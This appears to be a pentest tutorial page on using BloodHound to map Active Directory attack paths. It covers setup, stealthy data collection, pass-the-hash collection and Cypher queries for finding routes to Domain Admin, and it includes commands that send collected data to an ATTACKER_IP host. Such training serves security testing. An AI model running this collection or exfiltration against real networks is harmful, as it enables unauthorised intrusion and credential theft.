---
title: BloodHound for Active Directory Hacking
description: BloodHound for Active Directory enumeration, attack path discovery, and privilege escalation — from data collection with SharpHound to exploiting complex AD relationships for domain dominance.
navigation:
  icon: i-lucide-route
  title: BloodHound AD Hacking
---

## Introduction

**BloodHound** is a graph-based Active Directory reconnaissance tool that reveals hidden and unintended relationships within an AD environment. It uses **graph theory** to map out attack paths that would be nearly impossible to discover manually — turning weeks of manual enumeration into minutes of visual analysis.

::note
BloodHound doesn't exploit anything directly. It **maps relationships** and **reveals attack paths**. You still need offensive tools like Impacket, Rubeus, Mimikatz, and PowerView to walk those paths.
::

```
┌─────────────────────────────────────────────────────────────────┐
│                    BloodHound Architecture                       │
│                                                                 │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────┐   │
│  │  SharpHound  │───▶│   Neo4j DB   │◀───│  BloodHound GUI  │   │
│  │  (Collector) │    │  (Graph DB)  │    │  (Visualizer)    │   │
│  └──────────────┘    └──────────────┘    └──────────────────┘   │
│        │                    │                     │              │
│  Collects AD data    Stores nodes &         Queries graph       │
│  - Users, Groups     relationships          Shows attack paths  │
│  - Computers         - ACLs, Sessions       Custom Cypher       │
│  - GPOs, ACLs        - Group membership     Mark owned/targets  │
│  - Sessions          - Trust relationships                      │
│  - Trusts                                                       │
└─────────────────────────────────────────────────────────────────┘
```

::card-group
  ::card
  ---
  title: BloodHound GitHub
  icon: i-simple-icons-github
  to: https://github.com/BloodHoundAD/BloodHound
  target: _blank
  ---
  Original BloodHound repository — legacy GUI version with SharpHound collector.
  ::

  ::card
  ---
  title: BloodHound Community Edition
  icon: i-simple-icons-github
  to: https://github.com/SpecterOps/BloodHound
  target: _blank
  ---
  BloodHound CE — modern web-based interface by SpecterOps with API support.
  ::

  ::card
  ---
  title: SharpHound Collector
  icon: i-simple-icons-dotnet
  to: https://github.com/BloodHoundAD/SharpHound
  target: _blank
  ---
  Official .NET-based data collector for Windows Active Directory environments.
  ::

  ::card
  ---
  title: BloodHound.py (Python)
  icon: i-simple-icons-python
  to: https://github.com/dirkjanm/BloodHound.py
  target: _blank
  ---
  Python-based remote collector — collect AD data from Linux without touching the domain controller.
  ::
::

::badge
**Tags: tutorials · bloodhound · active-directory · pentesting · privilege-escalation · attack-paths · domain-admin · cypher-queries**
::

---

## How BloodHound Thinks — The Graph Theory Approach

::tip
Traditional AD enumeration asks *"What permissions does this user have?"*. BloodHound asks *"What is the shortest path from this compromised user to Domain Admin?"* — a fundamentally different and more powerful approach.
::

### Nodes and Edges

BloodHound models Active Directory as a **directed graph** where:

| Concept | AD Equivalent | Example |
| --- | --- | --- |
| **Node** | AD Object | User, Computer, Group, Domain, GPO, OU |
| **Edge** | Relationship / Permission | MemberOf, AdminTo, HasSession, GenericAll, WriteDacl |
| **Path** | Chain of relationships | User → MemberOf → Group → AdminTo → Computer → HasSession → DomainAdmin |

### Relationship Types (Edges)

::field-group
  ::field{name="MemberOf" type="edge"}
  User or group is a **member** of another group. Transitive — nested group memberships create indirect paths.
  ::

  ::field{name="AdminTo" type="edge"}
  Principal has **local admin rights** on a computer. Can dump credentials, execute code, pivot.
  ::

  ::field{name="HasSession" type="edge"}
  A user has an **active session** on a computer. If you admin that computer, you can steal their credentials.
  ::

  ::field{name="GenericAll" type="edge"}
  **Full control** over an object. Can reset passwords, modify group membership, write SPNs, etc.
  ::

  ::field{name="GenericWrite" type="edge"}
  Can **modify non-protected attributes** of an object. Write SPN for Kerberoasting, modify logon scripts.
  ::

  ::field{name="WriteDacl" type="edge"}
  Can **modify the DACL** (permissions) on an object. Grant yourself GenericAll, then take full control.
  ::

  ::field{name="WriteOwner" type="edge"}
  Can **change the owner** of an object. Owners can modify DACLs, leading to full control.
  ::

  ::field{name="ForceChangePassword" type="edge"}
  Can **reset password** of another user without knowing the current password.
  ::

  ::field{name="AddMember" type="edge"}
  Can **add members** to a group. Add yourself to Domain Admins or other privileged groups.
  ::

  ::field{name="ReadLAPSPassword" type="edge"}
  Can **read the LAPS password** (local admin password) stored in AD for a computer.
  ::

  ::field{name="AllowedToDelegate" type="edge"}
  Configured for **Kerberos delegation**. Can impersonate users to specific services.
  ::

  ::field{name="DCSync" type="edge"}
  Has the rights (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) to perform a **DCSync** attack and dump all password hashes from the domain controller.
  ::

  ::field{name="GPLink" type="edge"}
  A **GPO is linked** to an OU or domain. Control the GPO → control all objects in that OU.
  ::

  ::field{name="Contains" type="edge"}
  An OU **contains** users, computers, or other OUs. Used for understanding GPO scope.
  ::

  ::field{name="CanRDP" type="edge"}
  Principal can **RDP** into a computer. Remote Desktop Users group membership.
  ::

  ::field{name="CanPSRemote" type="edge"}
  Principal can use **PowerShell Remoting** (WinRM) on a computer.
  ::

  ::field{name="ExecuteDCOM" type="edge"}
  Principal can execute commands via **DCOM** on a computer.
  ::

  ::field{name="SQLAdmin" type="edge"}
  Principal is a **sysadmin** on a SQL Server instance. Can execute OS commands via `xp_cmdshell`.
  ::
::

---

## Phase 1 — Installation & Setup

### Option A: BloodHound Legacy (GUI + Neo4j)

::steps{level="4"}

#### Step 1: Install Neo4j Database

::tabs
  :::tabs-item{icon="i-simple-icons-kalilinux" label="Kali Linux"}
  ```bash [Neo4j on Kali]
  # Neo4j is pre-installed on Kali
  # Start the service
  sudo neo4j start
  
  # Or start in console mode (see logs)
  sudo neo4j console
  
  # Access Neo4j browser
  # http://localhost:7474
  # Default credentials: neo4j / neo4j
  # You'll be prompted to set a new password
  # Set to: bloodhound (or your preference)
  ```
  :::

  :::tabs-item{icon="i-simple-icons-ubuntu" label="Ubuntu/Debian"}
  ```bash [Neo4j on Ubuntu]
  # Add Neo4j repository
  wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo gpg --dearmor -o /usr/share/keyrings/neo4j.gpg
  
  echo 'deb [signed-by=/usr/share/keyrings/neo4j.gpg] https://debian.neo4j.com stable 4.4' | sudo tee /etc/apt/sources.list.d/neo4j.list
  
  # Install Java 11 (required)
  sudo apt update
  sudo apt install -y openjdk-11-jdk
  
  # Install Neo4j
  sudo apt install -y neo4j
  
  # Start Neo4j
  sudo systemctl enable neo4j
  sudo systemctl start neo4j
  
  # Set initial password
  # Visit http://localhost:7474
  # Login: neo4j / neo4j → change to bloodhound
  ```
  :::

  :::tabs-item{icon="i-simple-icons-apple" label="macOS"}
  ```bash [Neo4j on macOS]
  # Install via Homebrew
  brew install neo4j
  
  # Start Neo4j
  neo4j start
  
  # Access: http://localhost:7474
  # Default: neo4j / neo4j → change password
  ```
  :::
::

#### Step 2: Install BloodHound GUI

```bash [Install BloodHound]
# Kali Linux (pre-installed or via apt)
sudo apt install -y bloodhound

# Or download latest release
wget https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
cd BloodHound-linux-x64
chmod +x BloodHound
./BloodHound --no-sandbox
```

#### Step 3: Launch BloodHound

```bash [Launch BloodHound]
# Make sure Neo4j is running first
sudo neo4j start

# Wait for Neo4j to fully start (check http://localhost:7474)
sleep 10

# Launch BloodHound
bloodhound

# Or from extracted directory
./BloodHound --no-sandbox

# Login with Neo4j credentials
# URL: bolt://localhost:7687
# Username: neo4j
# Password: bloodhound (the password you set)
```

::

### Option B: BloodHound Community Edition (CE)

::note
BloodHound CE is the **modern replacement** — web-based, API-driven, and actively maintained by SpecterOps. It uses **PostgreSQL** instead of Neo4j.
::

::collapsible
**BloodHound CE Docker Deployment**

```yaml [docker-compose.yml]
version: '3.8'

services:
  bloodhound:
    image: specterops/bloodhound:latest
    container_name: bloodhound-ce
    ports:
      - "8080:8080"
    environment:
      - bhe_disable_cypher=false
    depends_on:
      postgres:
        condition: service_healthy
      neo4j:
        condition: service_healthy
    volumes:
      - bloodhound-config:/opt/bloodhound/config
    networks:
      - bloodhound-net
    restart: unless-stopped

  postgres:
    image: postgres:16
    container_name: bloodhound-postgres
    environment:
      POSTGRES_USER: bloodhound
      POSTGRES_PASSWORD: bloodhoundcommunityedition
      POSTGRES_DB: bloodhound
    volumes:
      - postgres-data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U bloodhound"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - bloodhound-net
    restart: unless-stopped

  neo4j:
    image: neo4j:4.4
    container_name: bloodhound-neo4j
    environment:
      NEO4J_AUTH: neo4j/bloodhoundcommunityedition
      NEO4J_dbms_allow__upgrade: "true"
    ports:
      - "7474:7474"
      - "7687:7687"
    volumes:
      - neo4j-data:/data
    healthcheck:
      test: ["CMD-SHELL", "wget -qO- http://localhost:7474 || exit 1"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - bloodhound-net
    restart: unless-stopped

volumes:
  bloodhound-config:
  postgres-data:
  neo4j-data:

networks:
  bloodhound-net:
    driver: bridge
```

```bash [Deploy BloodHound CE]
# Create directory
mkdir -p ~/bloodhound-ce && cd ~/bloodhound-ce

# Create docker-compose.yml (paste content above)
nano docker-compose.yml

# Launch
docker compose up -d

# Wait for services to start
sleep 30

# Check status
docker compose ps

# Access BloodHound CE
# URL: http://localhost:8080
# Check initial admin password in logs:
docker compose logs bloodhound 2>&1 | grep "Initial Password"

# Default: admin / <password from logs>
```
::

---

## Phase 2 — Data Collection

::warning
Data collection is the **most critical phase** and the most likely to trigger security alerts. Choose your collector and method based on the engagement rules and detection risk.
::

### Collection Methods Comparison

| Collector | Platform | Stealth | Speed | Completeness | Requirements |
| --- | --- | --- | --- | --- | --- |
| **SharpHound.exe** | Windows | `Low` | `Fast` | `Complete` | Domain user, Windows host |
| **SharpHound.ps1** | Windows | `Low-Med` | `Fast` | `Complete` | Domain user, PowerShell |
| **BloodHound.py** | Linux | `Medium` | `Medium` | `Good` | Domain creds, network access |
| **BOFHound** | Windows | `High` | `Slow` | `Partial` | Beacon/C2, LDAP BOFs |
| **ADExplorer snapshot** | Windows | `High` | `Fast` | `Good` | Domain user, SysInternals |
| **RustHound** | Cross-platform | `Medium` | `Fast` | `Good` | Domain creds |

### SharpHound (Windows — Primary Collector)

::tabs
  :::tabs-item{icon="i-lucide-zap" label="Basic Collection"}
  ```powershell [SharpHound Basic Collection]
  # ============================================
  # Download SharpHound
  # ============================================
  # From: https://github.com/BloodHoundAD/SharpHound/releases
  
  # ============================================
  # BASIC: Collect everything (DEFAULT)
  # ============================================
  .\SharpHound.exe --CollectionMethods All
  
  # Equivalent PowerShell version
  Import-Module .\SharpHound.ps1
  Invoke-BloodHound -CollectionMethod All
  
  # ============================================
  # Output: <timestamp>_BloodHound.zip
  # Contains: computers.json, users.json, groups.json,
  #           domains.json, gpos.json, ous.json, sessions.json
  # ============================================
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="Targeted Collection"}
  ```powershell [SharpHound Targeted Collection]
  # ============================================
  # COLLECTION METHOD OPTIONS
  # ============================================
  
  # Group membership only (fastest, quietest)
  .\SharpHound.exe --CollectionMethods Group
  
  # Sessions only (who is logged in where)
  .\SharpHound.exe --CollectionMethods Session
  
  # Local admin enumeration
  .\SharpHound.exe --CollectionMethods LocalAdmin
  
  # ACLs (permissions — critical for attack paths)
  .\SharpHound.exe --CollectionMethods ACL
  
  # All except sessions (less noisy)
  .\SharpHound.exe --CollectionMethods Default
  
  # Combine specific methods
  .\SharpHound.exe --CollectionMethods Group,ACL,Trusts,ObjectProps
  
  # ============================================
  # TARGETED: Specific domain or OU
  # ============================================
  
  # Specific domain
  .\SharpHound.exe --CollectionMethods All --Domain corp.local
  
  # Specific domain controller
  .\SharpHound.exe --CollectionMethods All --DomainController dc01.corp.local
  
  # Specific OU only
  .\SharpHound.exe --CollectionMethods All --SearchBase "OU=IT,DC=corp,DC=local"
  
  # ============================================
  # STEALTH OPTIONS
  # ============================================
  
  # Stealth mode (only queries DCs, no computer enumeration)
  .\SharpHound.exe --CollectionMethods All --Stealth
  
  # Throttle requests (avoid detection)
  .\SharpHound.exe --CollectionMethods All --Throttle 1000 --Jitter 30
  
  # Randomize computer enumeration order
  .\SharpHound.exe --CollectionMethods All --RandomizeFilenames
  
  # Custom output location
  .\SharpHound.exe --CollectionMethods All --OutputDirectory C:\Users\Public\Documents
  
  # Encrypt output with password
  .\SharpHound.exe --CollectionMethods All --ZipPassword "hunter2"
  ```
  :::

  :::tabs-item{icon="i-lucide-repeat" label="Loop Collection"}
  ```powershell [SharpHound Loop Collection]
  # ============================================
  # SESSION LOOP (continuous session monitoring)
  # ============================================
  # Sessions are ephemeral — users log on/off
  # Loop collection catches sessions over time
  
  # Loop session collection for 2 hours
  .\SharpHound.exe --CollectionMethods Session --Loop --LoopDuration 02:00:00
  
  # Loop with 5-minute intervals
  .\SharpHound.exe --CollectionMethods Session --Loop --LoopDuration 04:00:00 --LoopInterval 00:05:00
  
  # Session loop + initial full collection
  .\SharpHound.exe --CollectionMethods All --Loop --LoopDuration 01:00:00
  
  # ============================================
  # Why loop?
  # ============================================
  # - Domain Admins may only log in at specific times
  # - Session data is point-in-time
  # - More sessions = more attack paths discovered
  # - Run overnight for best coverage
  ```
  :::
::

### BloodHound.py (Linux — Remote Collection)

::caution
`BloodHound.py` collects data **remotely** from a Linux attacker machine. You need valid domain credentials and network access to the domain controller.
::

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```bash [BloodHound.py Collection]
# ============================================
# INSTALLATION
# ============================================
pip3 install bloodhound
# Or from source
git clone https://github.com/dirkjanm/BloodHound.py.git
cd BloodHound.py
pip3 install .

# ============================================
# BASIC COLLECTION
# ============================================

# With password
bloodhound-python -u 'jsmith' -p 'Password123!' -d corp.local -ns 10.0.0.50 -c All

# With NTLM hash (pass-the-hash)
bloodhound-python -u 'jsmith' --hashes ':aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe' -d corp.local -ns 10.0.0.50 -c All

# With Kerberos ticket
export KRB5CCNAME=/tmp/jsmith.ccache
bloodhound-python -u 'jsmith' -d corp.local -ns 10.0.0.50 -c All -k --auth-method kerberos

# ============================================
# COLLECTION METHOD OPTIONS
# ============================================

# Specific collection methods
bloodhound-python -u 'jsmith' -p 'Password123!' -d corp.local -ns 10.0.0.50 -c Group,ACL,Trusts

# Available methods: Group, LocalAdmin, Session, Trusts, Default, All
# ObjectProps, ACL, DCOM, RDP, PSRemote, LoggedOn, Container

# ============================================
# ADVANCED OPTIONS
# ============================================

# Custom DNS server
bloodhound-python -u 'jsmith' -p 'Password123!' -d corp.local -ns 10.0.0.50 -c All --dns-tcp

# Specific DC
bloodhound-python -u 'jsmith' -p 'Password123!' -d corp.local -dc dc01.corp.local -c All

# Output to specific directory
bloodhound-python -u 'jsmith' -p 'Password123!' -d corp.local -ns 10.0.0.50 -c All --output-dir ./bhdata

# Disable certificate validation
bloodhound-python -u 'jsmith' -p 'Password123!' -d corp.local -ns 10.0.0.50 -c All --disable-autogc

# Zip output
bloodhound-python -u 'jsmith' -p 'Password123!' -d corp.local -ns 10.0.0.50 -c All --zip
```

#code
```bash
# Quick collection from Linux
bloodhound-python -u 'user' -p 'pass' -d domain.local -ns DC_IP -c All --zip
```
::

### RustHound (Cross-Platform Alternative)

::collapsible
**RustHound — Fast Cross-Platform Collector**

```bash [RustHound Collection]
# ============================================
# INSTALLATION
# ============================================

# From release binary
wget https://github.com/NH-RED-TEAM/RustHound/releases/latest/download/rusthound_linux
chmod +x rusthound_linux

# From cargo
cargo install rusthound

# ============================================
# COLLECTION
# ============================================

# Basic collection
./rusthound_linux -d corp.local -u 'jsmith@corp.local' -p 'Password123!' -o ./output --zip

# With specific DC
./rusthound_linux -d corp.local -u 'jsmith' -p 'Password123!' --ldapip 10.0.0.50 -o ./output --zip

# With ADCS (certificate services) collection
./rusthound_linux -d corp.local -u 'jsmith' -p 'Password123!' -o ./output --zip --adcs

# ============================================
# Advantages over BloodHound.py:
# - Faster execution
# - ADCS data collection
# - Cross-platform binary
# - Less dependencies
# ============================================
```
::

### ADExplorer Snapshot Method (Stealthiest)

::collapsible
**ADExplorer — SysInternals Legitimate Tool (Most Stealthy)**

```powershell [ADExplorer Snapshot Collection]
# ============================================
# WHY ADExplorer?
# ============================================
# - It's a SIGNED MICROSOFT BINARY (SysInternals)
# - Won't trigger AV/EDR
# - Takes a complete AD snapshot
# - Can be converted to BloodHound format offline
# ============================================

# Step 1: Download ADExplorer from SysInternals
# https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer

# Step 2: Take snapshot (on domain-joined Windows)
.\ADExplorer.exe -snapshot "" "C:\Users\Public\ad_snapshot.dat"

# Step 3: Exfiltrate the snapshot file to your attacker machine

# Step 4: Convert to BloodHound format using ADExplorerSnapshot.py
# On attacker machine:
pip3 install adexplorersnapshotpy

# Convert
python3 -m adexplorersnapshotpy ad_snapshot.dat -o bloodhound_output/

# This produces JSON files compatible with BloodHound
```
::

---

## Phase 3 — Importing Data into BloodHound

::steps{level="4"}

#### Step 1: Transfer Collection Data

```bash [Transfer Data to Attacker]
# From Windows target to Linux attacker

# If you have a C2/shell on the target
# Download the ZIP file through your C2

# Or via SMB
smbclient //ATTACKER_IP/share -U anonymous -c "put 20240101_BloodHound.zip"

# Or via HTTP (start web server on attacker)
# Attacker:
python3 -m http.server 8888
# Target (PowerShell):
Invoke-WebRequest -Uri "http://ATTACKER_IP:8888/upload" -Method POST -InFile "20240101_BloodHound.zip"

# Or base64 encode and copy (for small datasets)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("20240101_BloodHound.zip")) | Out-File encoded.txt
```

#### Step 2: Import into BloodHound Legacy

```bash [Import Data - Legacy]
# Launch BloodHound (Neo4j must be running)
sudo neo4j start
bloodhound

# In BloodHound GUI:
# 1. Click the "Upload Data" button (up arrow icon) on the right side
# 2. Select the .zip file from SharpHound/BloodHound.py
# 3. Wait for import to complete
# 4. Check the "Database Info" tab for statistics

# Or drag and drop the ZIP file directly into the BloodHound window
```

#### Step 3: Import into BloodHound CE

```bash [Import Data - CE]
# Using the API
curl -X POST "http://localhost:8080/api/v2/file-upload/start" \
  -H "Authorization: Bearer YOUR_API_TOKEN" \
  -H "Content-Type: application/json"

# Upload file
curl -X POST "http://localhost:8080/api/v2/file-upload" \
  -H "Authorization: Bearer YOUR_API_TOKEN" \
  -F "file=@20240101_BloodHound.zip"

# Or use the web UI:
# 1. Login to http://localhost:8080
# 2. Navigate to File Upload
# 3. Upload the ZIP file
```

#### Step 4: Verify Import

```bash [Verify Data]
# In BloodHound GUI → Database Info tab
# You should see:
# - Users: xxx
# - Computers: xxx
# - Groups: xxx
# - Sessions: xxx
# - ACLs: xxx
# - Relationships: xxx

# Quick sanity check — search for "Domain Admins"
# Should show the Domain Admins group with members
```

::

---

## Phase 4 — BloodHound Analysis & Built-in Queries

::tip
BloodHound's power comes from **pre-built queries** and the ability to write **custom Cypher queries**. Start with the pre-built queries, then learn Cypher for advanced analysis.
::

### Pre-Built Queries

BloodHound includes powerful pre-built queries accessible from the **Analysis** tab:

::accordion
  :::accordion-item{icon="i-lucide-crown" label="Domain Admin Queries"}
  ```
  BUILT-IN QUERIES — DOMAIN ADMIN FOCUSED
  ═══════════════════════════════════════════
  
  ► Find all Domain Admins
    Shows all members of Domain Admins group (including nested)
  
  ► Shortest Paths to Domain Admins
    THE MOST IMPORTANT QUERY — shows the shortest attack path
    from any compromised principal to Domain Admin
  
  ► Shortest Paths to Domain Admins from Owned Principals
    After marking nodes as "Owned", shows paths from YOUR
    compromised accounts to Domain Admin
  
  ► Find Principals with DCSync Rights
    Users/groups with DS-Replication-Get-Changes-All
    These can dump ALL password hashes from the DC
  
  ► Users with Foreign Domain Group Membership
    Users from other domains that are members of groups
    in this domain — cross-domain attack paths
  
  ► Groups with Foreign Domain Group Membership
    Groups from other domains with membership in local groups
  ```
  :::

  :::accordion-item{icon="i-lucide-key" label="Kerberos Queries"}
  ```
  BUILT-IN QUERIES — KERBEROS ATTACKS
  ═══════════════════════════════════════════
  
  ► Find AS-REP Roastable Users (DontReqPreAuth)
    Users with Kerberos pre-authentication disabled
    Can request encrypted ticket and crack offline
  
  ► Find Kerberoastable Users
    Users with SPNs set — request service ticket
    and crack the password hash offline
  
  ► Find Kerberoastable Members of High Value Groups
    Kerberoastable users who are also in privileged groups
    HIGH PRIORITY TARGETS
  
  ► Shortest Paths from Kerberoastable Users
    Attack paths that START from Kerberoastable users
    If you crack their password → these paths open up
  
  ► Find Computers with Unconstrained Delegation
    Machines that can impersonate ANY user
    If compromised → can capture TGTs
  
  ► Find Computers with Constrained Delegation
    Machines that can impersonate users to SPECIFIC services
    Protocol transition attacks possible
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="High-Value & Dangerous Queries"}
  ```
  BUILT-IN QUERIES — DANGEROUS CONFIGURATIONS
  ═══════════════════════════════════════════
  
  ► Find Computers where Domain Users are Local Admin
    If "Domain Users" have local admin on ANY computer
    → EVERY domain user can compromise that machine
  
  ► Find Computers where Domain Users can RDP
    Domain Users with RDP access — potential pivot points
  
  ► Shortest Paths to Unconstrained Delegation Systems
    Attack paths to machines with unconstrained delegation
  
  ► Shortest Paths from Domain Users to High Value Targets
    What can ANY authenticated domain user reach?
  
  ► Find GPOs that modify Local Group Memberships
    GPOs that add users/groups to local admin groups
  
  ► Find Computers with LAPS Enabled
    Machines using LAPS — who can read those passwords?
  
  ► Shortest Paths to Systems with LAPS Passwords
    How to reach machines where you can read LAPS
  ```
  :::
::

### Marking Owned Nodes & High-Value Targets

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```cypher [Mark Owned Nodes]
-- In BloodHound GUI:
-- 1. Search for the compromised user/computer
-- 2. Right-click the node
-- 3. Select "Mark as Owned"

-- This enables the query:
-- "Shortest Paths to Domain Admins from Owned Principals"

-- You can also mark nodes as "High Value" targets
-- Right-click → Mark as High Value

-- ============================================
-- VIA CYPHER (direct Neo4j query)
-- ============================================

-- Mark a user as owned
MATCH (u:User {name: "JSMITH@CORP.LOCAL"})
SET u.owned = true
RETURN u

-- Mark a computer as owned
MATCH (c:Computer {name: "WS01.CORP.LOCAL"})
SET c.owned = true
RETURN c

-- Mark multiple users as owned (from compromised list)
MATCH (u:User)
WHERE u.name IN ["JSMITH@CORP.LOCAL", "MJONES@CORP.LOCAL", "SVC_SQL@CORP.LOCAL"]
SET u.owned = true
RETURN u

-- Mark a group as high value target
MATCH (g:Group {name: "IT_ADMINS@CORP.LOCAL"})
SET g.highvalue = true
RETURN g
```

#code
```cypher
MATCH (u:User {name: "JSMITH@CORP.LOCAL"})
SET u.owned = true
RETURN u
```
::

---

## Phase 5 — Custom Cypher Queries (The Real Power)

::note
BloodHound's pre-built queries cover common scenarios. **Custom Cypher queries** let you ask specific questions about the AD environment that are tailored to your engagement.
::

### Essential Custom Queries

::tabs
  :::tabs-item{icon="i-lucide-users" label="User Enumeration"}
  ```cypher [User Enumeration Queries]
  // ============================================
  // USERS WITH DESCRIPTIONS (often contain passwords!)
  // ============================================
  MATCH (u:User)
  WHERE u.description IS NOT NULL
  RETURN u.name, u.description
  
  // ============================================
  // USERS WITH "password" IN DESCRIPTION
  // ============================================
  MATCH (u:User)
  WHERE u.description =~ '(?i).*pass.*'
  RETURN u.name, u.description
  
  // ============================================
  // ENABLED USERS WITH PASSWORD NEVER EXPIRES
  // ============================================
  MATCH (u:User {enabled: true, pwdneverexpires: true})
  RETURN u.name, u.description, u.lastlogon
  ORDER BY u.lastlogon DESC
  
  // ============================================
  // USERS THAT HAVEN'T LOGGED IN (90+ days)
  // ============================================
  MATCH (u:User {enabled: true})
  WHERE u.lastlogon < (datetime().epochSeconds - (90 * 86400))
  RETURN u.name, u.lastlogon
  
  // ============================================
  // USERS WITH PASSWORD NOT REQUIRED
  // ============================================
  MATCH (u:User {passwordnotreqd: true, enabled: true})
  RETURN u.name
  
  // ============================================
  // USERS WITH ADMIN COUNT = 1 (protected users)
  // ============================================
  MATCH (u:User {admincount: true})
  RETURN u.name
  
  // ============================================
  // ALL USERS AND THEIR GROUP MEMBERSHIPS
  // ============================================
  MATCH (u:User)-[:MemberOf*1..]->(g:Group)
  RETURN u.name AS User, collect(g.name) AS Groups
  ORDER BY u.name
  ```
  :::

  :::tabs-item{icon="i-lucide-monitor" label="Computer Enumeration"}
  ```cypher [Computer Enumeration Queries]
  // ============================================
  // ALL DOMAIN CONTROLLERS
  // ============================================
  MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
  WHERE g.name =~ '(?i)domain controllers.*'
  RETURN c.name, c.operatingsystem
  
  // ============================================
  // COMPUTERS WITH UNSUPPORTED OS
  // ============================================
  MATCH (c:Computer)
  WHERE c.operatingsystem =~ '(?i).*(2003|2008|xp|vista|7).*'
  RETURN c.name, c.operatingsystem
  
  // ============================================
  // COMPUTERS WITH UNCONSTRAINED DELEGATION
  // ============================================
  MATCH (c:Computer {unconstraineddelegation: true})
  WHERE NOT c.name CONTAINS 'DC'
  RETURN c.name, c.operatingsystem
  
  // ============================================
  // COMPUTERS WITH CONSTRAINED DELEGATION
  // ============================================
  MATCH (c:Computer)
  WHERE c.allowedtodelegate IS NOT NULL
  RETURN c.name, c.allowedtodelegate
  
  // ============================================
  // COMPUTERS WHERE SPECIFIC USER HAS SESSION
  // ============================================
  MATCH (c:Computer)-[:HasSession]->(u:User {name: "DADMIN@CORP.LOCAL"})
  RETURN c.name
  
  // ============================================
  // COMPUTERS WITH LAPS ENABLED
  // ============================================
  MATCH (c:Computer {haslaps: true})
  RETURN c.name, c.operatingsystem
  
  // ============================================
  // ALL COMPUTERS WITH LOCAL ADMIN USERS
  // ============================================
  MATCH (u)-[:AdminTo]->(c:Computer)
  RETURN c.name AS Computer, collect(u.name) AS LocalAdmins
  ```
  :::

  :::tabs-item{icon="i-lucide-route" label="Attack Path Queries"}
  ```cypher [Attack Path Queries]
  // ============================================
  // SHORTEST PATH FROM OWNED TO DOMAIN ADMINS
  // ============================================
  MATCH p=shortestPath(
    (u {owned: true})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
  )
  RETURN p
  
  // ============================================
  // ALL PATHS FROM SPECIFIC USER TO DA (max 8 hops)
  // ============================================
  MATCH p=allShortestPaths(
    (u:User {name: "JSMITH@CORP.LOCAL"})-[*1..8]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
  )
  RETURN p
  
  // ============================================
  // FIND PATHS THROUGH SPECIFIC EDGE TYPES
  // ============================================
  MATCH p=shortestPath(
    (u:User {name: "JSMITH@CORP.LOCAL"})-[:MemberOf|AdminTo|HasSession|GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
  )
  RETURN p
  
  // ============================================
  // USERS WITH PATH TO DA (count)
  // ============================================
  MATCH p=shortestPath(
    (u:User {enabled: true})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
  )
  RETURN u.name, length(p) AS PathLength
  ORDER BY PathLength ASC
  
  // ============================================
  // PATHS THROUGH ACL ABUSE
  // ============================================
  MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword]->(target)
  WHERE u.owned = true
  RETURN p
  
  // ============================================
  // FIND COMPUTERS WITH PATH TO DA VIA SESSIONS
  // ============================================
  MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
  RETURN c.name AS Computer, u.name AS DomainAdmin
  
  // ============================================
  // FIND SHORTEST PATH BETWEEN ANY TWO NODES
  // ============================================
  MATCH p=shortestPath(
    (a {name: "JSMITH@CORP.LOCAL"})-[*1..]->(b {name: "DC01.CORP.LOCAL"})
  )
  RETURN p
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="ACL Abuse Queries"}
  ```cypher [ACL Abuse Discovery Queries]
  // ============================================
  // WHO HAS GenericAll ON DOMAIN ADMINS GROUP?
  // ============================================
  MATCH (u)-[:GenericAll]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
  RETURN u.name, labels(u)
  
  // ============================================
  // ALL GenericAll RELATIONSHIPS (dangerous!)
  // ============================================
  MATCH (u)-[:GenericAll]->(target)
  WHERE NOT u.name CONTAINS 'ADMIN'
  RETURN u.name AS Source, labels(target), target.name AS Target
  
  // ============================================
  // WHO CAN MODIFY DACLs ON HIGH VALUE TARGETS?
  // ============================================
  MATCH (u)-[:WriteDacl]->(target {highvalue: true})
  RETURN u.name, target.name
  
  // ============================================
  // WHO CAN FORCE CHANGE PASSWORDS?
  // ============================================
  MATCH (u)-[:ForceChangePassword]->(target:User)
  WHERE u.name <> target.name
  RETURN u.name AS CanResetPW, target.name AS TargetUser
  
  // ============================================
  // WHO CAN ADD MEMBERS TO SENSITIVE GROUPS?
  // ============================================
  MATCH (u)-[:AddMember]->(g:Group)
  WHERE g.highvalue = true OR g.name =~ '(?i).*(admin|operator|manager).*'
  RETURN u.name, g.name
  
  // ============================================
  // WRITE OWNER CHAINS (modify ownership → full control)
  // ============================================
  MATCH (u)-[:WriteOwner]->(target)
  RETURN u.name AS CanChangeOwner, labels(target), target.name
  
  // ============================================
  // ALL ACL EDGES FROM OWNED USERS
  // ============================================
  MATCH p=(u {owned: true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddMember|AllExtendedRights]->(target)
  RETURN p
  
  // ============================================
  // USERS WHO CAN DCSYNC
  // ============================================
  MATCH (u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain)
  RETURN u.name, labels(u)
  
  // ============================================
  // USERS WITH OWNERSHIP OF OTHER OBJECTS
  // ============================================
